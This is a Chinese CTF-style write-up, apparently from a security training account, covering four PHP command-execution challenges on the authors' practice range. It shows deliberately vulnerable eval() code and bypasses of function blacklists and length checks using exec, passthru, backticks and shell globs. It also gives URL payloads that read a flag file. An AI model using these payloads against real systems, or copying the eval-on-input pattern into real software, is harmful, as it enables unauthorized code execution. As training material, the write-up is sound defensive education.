---
title: 禁了 system 就安全？六边形靶场 RCE 上篇：从 exec 打到反引号
url: https://mp.weixin.qq.com/s/gisfie_rV-qfUXdstr76JQ
source: Doonsec's feed
date: 2026-07-12
fetch_date: 2026-07-13T05:26:11.447535
---

# 禁了 system 就安全？六边形靶场 RCE 上篇：从 exec 打到反引号

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/FaZFJ7xrqJZH4jR6CJibx75X6PibMmT6WCgHiaXMEUib6QvFJhRibnzDYwS7NUVftB5QnOWhXTs7YdicnrWg61QNIceL1Z4YxGzurHhUAZUOAkkq8/0?wx_fmt=jpeg)

# 禁了 system 就安全？六边形靶场 RCE 上篇：从 exec 打到反引号

原创

网安布道师
网安布道师

六边形攻防安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> ❝
>
> 六边形攻防靶场 Web → Rce 系列 · 共三篇
> 上篇：4 道命令执行函数基础题，把“能执行”这件事先跑通。
>
> ❞

![](https://mmbiz.qpic.cn/mmbiz_png/FaZFJ7xrqJY1m0LauaKbickrTiayK3zgP3cyTzibZQ6htHQuNh0OpSlLeqnohX2NHmgz85x8VpRg3NZJ0TemViccRwZovL6HWNvU2cTZibuod68Y/640?wx_fmt=png&from=appmsg)

远程命令执行（Remote Code Execution，RCE）最危险的地方，不只是“能执行一条命令”，而是攻击者可能借此读取敏感文件、控制业务进程，甚至把 Web 漏洞扩展为主机失陷。

这套系列来自我们自己六边形攻防靶场。进入 **「题库 → Web → Rce」**，按题名搜索即可找到对应题目。本文只讨论靶场中的合法练习，请勿把 Payload 用于未授权目标。

## 系列导读

| 篇目 | 覆盖题目 | 主线 |
| --- | --- | --- |
| 上（本文） | `rce-cmdfunction1` ~ `rce-cmdfunction4` | 执行入口：函数与反引号 |
| 中 | `disable_functions` / 分隔符 / 空格 | 从“能执行”到“能拼语法” |
| 下 | 敏感词 / 无回显 / 斜线 / 长度限制 | 更刁钻的过滤与最短命令 |

本系列共 **「13 道题」**。建议按顺序刷。

**「每题阅读顺序（后文统一）」**：源码/环境 → 过滤点 → 绕过思路 → Payload → 结果 → 小结。

---

## 开打之前：RCE 基础速查

这里的 RCE 主要指 **「Web 里触发的操作系统命令执行」**（本篇重点）。
另有一类是 PHP **「代码执行」**（如 `eval`），中篇 `disable_functions` 题会碰到「不跑 shell、只读文件」的思路。

### PHP 常见外部命令接口

| 方式 | 是否自动输出 | 返回值特点 |
| --- | --- | --- |
| `system($cmd)` | 是，直接打印命令输出 | 返回输出的**「最后一行」** |
| `exec($cmd)` | 否 | 默认只返回最后一行；第 2 个参数 `$output` 可收**「逐行数组」**（常用 `var_dump` / `print_r` 打印） |
| `shell_exec($cmd)` | 否 | 返回**「完整」**输出字符串；应用不 `echo` 就等于无回显 |
| `passthru($cmd)` | 是，原样输出（含二进制） | 一般不靠返回值拿文本 |
| 反引号 `` `$cmd` `` | 否 | 语义接近 `shell_exec()` |

> ❝
>
> 在 Linux 上，上述接口多数会经 shell 解析，所以后面的分隔符、空格、通配符过滤才有意义。
>
> ❞

### 命令连接 / 调度（过滤常 ban 这些）

| 符号 | 含义 |
| --- | --- |
| `;` | 顺序执行，前后都跑 |
| `&&` | 前一条**「成功」**才执行后一条 |
| `||` | 前一条**「失败」**才执行后一条 |
| `|` | 管道：前一条 stdout → 后一条 stdin |
| `&` | 后台执行（过滤里也常当连接符处理） |
| 换行（`%0a` 等） | 有时可当「下一条命令」的结束/分隔 |

### Shell 通配（glob）

* `*`：当前路径分段内，匹配任意长度（含空），**「通常不跨 `/`」**
* `?`：匹配**「恰好一个」**字符
* `[a-z]` / `[0-9]`：匹配范围内**「一个」**字符

中下篇还会用到：`>name` 创建空文件；目录里单独执行 `*` 时，**「字典序第一个文件名会当命令、其余当参数」**。

**「先分清：函数有没有把结果打到页面上，以及返回值是「一行」还是「整段」。」**
很多「命令跑了但页面空白」的坑，都出在这里。

---

## 第一题：`rce-cmdfunction1`

**「平台路径」**：题库 → Web → Rce → `rce-cmdfunction1`
**「难度」**：easy · 分值 31

### 源码 / 环境分析

打开题目后，首页大致是：

```
<?phpif (isset($_GET['code'])) {    $code = $_GET['code'];    eval($code);} else {    highlight_file(__FILE__);}?>
```

要点：

1. 用户输入经 `eval()`**「直接当 PHP 代码执行」**（代码执行入口）
2. 同目录常有 `phpinfo.php`，可看 `disable_functions`
3. 实机上 `system` 在禁用列表里，但 **「`exec` 仍可用」**

### 过滤点

| 点 | 说明 |
| --- | --- |
| `disable_functions` | 禁了 `system()`，未封死全部命令执行 |
| `exec` 的返回值 | 默认只返回输出**「最后一行」**，不自动打印整段 |

`exec` 的函数原型大致是：

```
exec(string $command, array &$output = null, int &$result_code = null): string|false|null
```

* 不传第 2 个参数：只拿到最后一行字符串
* 传入 `$output`：每一行进数组，再用 `var_dump` / `print_r` 打出

### 绕过思路

1. 不用被 ban 的 `system`，改用 `exec`
2. 用第二参数接完整输出，再 `var_dump` 打印
3. 先 `ls` / `ls /` 定位，再 `cat /flag` 或 `cat /fl*`

### Payload

```
?code=exec('ls',$output);var_dump($output);?code=exec('cat /flag',$o);var_dump($o);
```

### 结果 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/FaZFJ7xrqJYVnbslO1AuZa3Z6Xv0LyAKEj1nPBEMdRR97GYaXesB5qElDwJ9es28REKEjsibCo0FEYNJ11cexeOYQtM0swfc3gEDunbibXZXQ/640?wx_fmt=png&from=appmsg)

`rce-cmdfunction1` 运行结果

*图：地址栏 URL 含 `exec` + `var_dump` Payload，页面数组回显 Flag。*

### 本题小结

看到某个危险函数被禁用时，不要立刻下结论。应同时检查：同类函数、返回值是否被输出、函数是否有额外输出参数。

---

## 第二题：`rce-cmdfunction2`

**「平台路径」**：题库 → Web → Rce → `rce-cmdfunction2`
**「难度」**：easy · 分值 32

### 源码 / 环境分析

入口形态与第一题同类，仍是把用户输入送进代码执行：

```
<?phpif (isset($_GET['code'])) {    $code = $_GET['code'];    eval($code);} else {    highlight_file(__FILE__);}?>
```

环境继续收紧可用的命令执行函数，但 **「`passthru()` 仍可用」**。

### 过滤点

| 点 | 说明 |
| --- | --- |
| 函数黑名单（部分） | 常见 `system` 等不可用 |
| 漏项 | `passthru` 仍在 |

`passthru` 与 `exec` 的差异：

| 函数 | 行为 |
| --- | --- |
| `exec` | 偏返回值；完整输出靠第 2 参数 |
| `passthru` | **「直接」** 把命令原始输出打进响应 |

### 绕过思路

全程用 `passthru`：确认执行 → 枚举 → 读 Flag。

### Payload

```
?code=passthru('ls');?code=passthru('ls /');?code=passthru('cat /flag');?code=passthru('cat /fl*');
```

### 结果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FaZFJ7xrqJaO8diaib7T68UFnaw8Atvfl0zFibU4BhanfFUf3ZTAJHuYsHSn615vr1d1QVsXPaRtWKhibhBTOic58NYeZVmCXyib5mibticAsnYRqkw/640?wx_fmt=png&from=appmsg)

`rce-cmdfunction2` 运行结果

*图：地址栏 URL 含 `passthru('cat /flag')`，页面直接回显 Flag。*

### 本题小结

仅按函数名做黑名单很难覆盖全部执行接口。不要假设“禁掉 `system` 就安全了”。

---

## 第三题：`rce-cmdfunction3`

**「平台路径」**：题库 → Web → Rce → `rce-cmdfunction3`
**「难度」**：easy · 分值 33

### 源码 / 环境分析

入口仍是：

```
<?phpif (isset($_GET['code'])) {    eval($_GET['code']);} else {    highlight_file(__FILE__);}?>
```

前两题对抗的是「换哪个函数」；本题要意识到 PHP 还有**「不以函数调用形式出现」**的执行能力。

### 过滤点

| 点 | 说明 |
| --- | --- |
| 函数名层面 | 常见命令函数可被禁用/过滤 |
| 未覆盖 | 反引号执行运算符 `` `cmd` `` |

语义近似：

```
echo shell_exec('ls');// 与echo `ls`;
```

### 绕过思路

把命令放进反引号，外层 `echo` 把返回字符串打到页面。

### Payload

```
?code=echo `ls`;?code=echo `ls /`;?code=echo `cat /flag`;?code=echo `cat /fl*`;
```

> ❝
>
> 反引号不是单引号。URL 中常编码为 `%60`。
>
> ❞

### 结果

![](https://mmbiz.qpic.cn/mmbiz_png/FaZFJ7xrqJbYOSNRT6Hf6uNic9vxsbdJdwYF2NEeRkVf17ahicHicPtyJeVvfgIZe1Go9yBDG6e07zNWJqoclXzgK5RylIcE2cpWS9IyhOt6ws/640?wx_fmt=png&from=appmsg)

rce-cmdfunction3

运行结果

*图：地址栏 URL 含 `echo \`cat /flag``，页面回显 Flag。*

### 本题小结

代码审计不能只搜 `system`、`exec`。反引号、危险回调、动态包含等也要进检查清单。

---

## 第四题：`rce-cmdfunction4`

**「平台路径」**：题库 → Web → Rce → `rce-cmdfunction4`
**「难度」**：easy · 分值 34

### 源码 / 环境分析

本题在 `eval` 前加了形态校验，核心逻辑接近：

```
<?phpif (isset($_GET['code'])) {    $code = $_GET['code'];    // 只允许 echo(……); 且括号内很短    if (';' === preg_replace('/echo\(.{0,10}\)/', '', $code)) {        echo 123;        eval($code);    } else {        echo "NoNoNo!!!";    }} else {    highlight_file(__FILE__);}?>
```

### 过滤点

从源码可直接读出：

1. 整体必须能被 `echo(.{0,10})` 匹配掉，最后只剩 `;`
2. 即形态为：`echo(……);`，且**「括号内最多约 10 个字符」**
3. 校验通过会先 `echo 123`，再 `eval`
4. `echo(\`cat /flag`);`括号内过长 →`NoNoNo!!!`

### 绕过思路

1. 外层满足 `echo(...);`
2. 括号内用反引号执行命令
3. 路径用 `/fl*` 压缩，卡进 10 字符限制

### Payload

```
?code=echo(`cat /fl*`);
```

### 结果

页面常见回显：`123` + Flag 内容。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FaZFJ7xrqJYOGVr8JG7eqM49vLicIicqGbJdr1NOD9QIWCkVNUmsicNZxepABlxlq7nVNvbGLmJdZdiawR5YWhjd3Lico7grwqicT6lDlRibFAQIaI/640?wx_fmt=png&from=appmsg)

`rce-cmdfunction4` 运行结果

*图：地址栏 URL 含 `echo(\`cat /fl*`);`，页面出现`123` 与 Flag。\*

### 本题小结

长度限制不等于安全边界。Shell 通配会在执行前展开很短的输入。

---

## 上篇总结

四道题统一练的是：

1. **「先看源码」**：输入进了 `eval` 还是 `system`？有没有正则/长度？
2. **「再列过滤点」**：禁了谁、漏了谁、返回值会不会显示？
3. **「再写绕过」**：换函数 / 换运算符 / 用通配压缩

| 题目 | 源码关键点 | 突破 |
| --- | --- | --- |
| `rce-cmdfunction1` | `eval` + `disable_functions` | `exec` 第二参数 + `var_dump` |
| `rce-cmdfunction2` | `eval` + 函数黑名单 | `passthru` 直出 |
| `rce-cmdfunction3` | `eval` + 函数黑名单 | 反引号 |
| `rce-cmdfunction4` | `echo(.{0,10})` 形态限制 | `echo(\` cat /fl\*`);` |

下一篇：`disable_functions`、分隔符、空格——继续先啃源码再绕。

---

## 去哪练？

**靶场注册：公众号回复【靶场邀请码】获取邀请码即可进行注册**

打开 https://hexlab.fun/ → **「题库 → Web → Rce」**
建议：先独立做，再回看文章复盘。

---

关注 **「六边形攻防安全」**，中篇见：黑名单、分隔符与空格。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/9qM7NQ3lGkBM9HNjOYhrvc9CNKbbd8pAl3cpffjDBworJnpCOkbD3Flx1XxRPlQbBAicglpPl0ZEGWVzdtCHsdA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过